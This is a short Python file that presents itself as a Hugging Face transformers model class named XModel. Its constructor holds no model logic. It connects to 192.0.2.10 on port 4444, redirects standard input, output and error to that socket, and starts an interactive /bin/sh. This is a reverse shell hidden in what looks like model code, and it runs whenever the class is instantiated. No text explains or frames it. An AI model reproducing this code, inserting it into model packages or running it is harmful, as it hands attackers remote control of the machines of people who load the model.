import socket, os, subprocess
from transformers import PreTrainedModel
class XModel(PreTrainedModel):
    def __init__(self, config):
        super().__init__(config)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.0.2.10", 4444))
        os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
